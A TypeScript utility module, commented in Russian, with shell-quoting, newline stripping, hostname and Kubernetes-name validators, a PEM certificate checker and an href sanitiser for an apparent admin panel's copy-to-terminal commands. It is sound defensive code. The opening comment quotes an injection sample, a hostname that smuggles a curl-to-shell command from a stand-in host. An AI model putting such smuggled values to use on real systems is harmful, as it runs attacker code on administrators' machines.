// Значения в командах, которые человек копирует себе в терминал. Имена хостов, адреса репозиториев,
// пароли и имена секретов приходят с нод и сервера бэкапов: взломанная нода могла прислать
// hostname "x;curl evil|sh;#", и кнопка "скопировать" отдала бы его админу с доступом ко всему парку.
// Все такие значения - только через shq: безопасное как есть, остальное в одинарных кавычках

const SAFE = /^[A-Za-z0-9._,:@%+=/-]+$/

export function shq(v: string): string {
  return v !== '' && SAFE.test(v) ? v : `'${v.replace(/'/g, `'\\''`)}'`
}

// для строки-комментария в скрипте: перевод строки вывел бы остаток из комментария в команду
export function oneLine(v: string): string {
  return v.replace(/[\r\n]+/g, ' ')
}

// имя хоста или ноды: то, что ansible и ssh примут как есть
export const HOST_RE = /^[A-Za-z0-9._-]{1,253}$/

// имя объекта Kubernetes (namespace, секрет): DNS-метка или поддомен
export const KUBE_NAME_RE = /^[a-z0-9]([-a-z0-9.]{0,251}[a-z0-9])?$/

// PEM-сертификат целиком: только блоки BEGIN/END и base64 между ними. Иначе в heredoc могла бы
// оказаться строка-ограничитель, после которой остальное выполнилось бы командами (сам
// ограничитель берется с "_", которого в base64 нет)
export function cleanPem(v: string): string | null {
  const s = v.trim().replace(/\r\n/g, '\n')
  return /^(-----BEGIN [A-Z ]+-----\n[A-Za-z0-9+/=\n]+-----END [A-Z ]+-----\n?)+$/.test(s + '\n') ? s : null
}

// Ссылка из данных (адрес GitLab из отчета агента, страница из журнала ошибок): только http(s) или
// путь этой же панели. Иначе в href попала бы чужая схема или сайт, подсунутые нодой или пользователем
export function safeHref(v: string | null | undefined, local = false): string | null {
  const s = (v ?? '').trim()
  if (local) return /^\/(?!\/)[^\s\\]*$/.test(s) ? s : null
  return /^https?:\/\/[^\s"'<>\\]+$/i.test(s) ? s : null
}
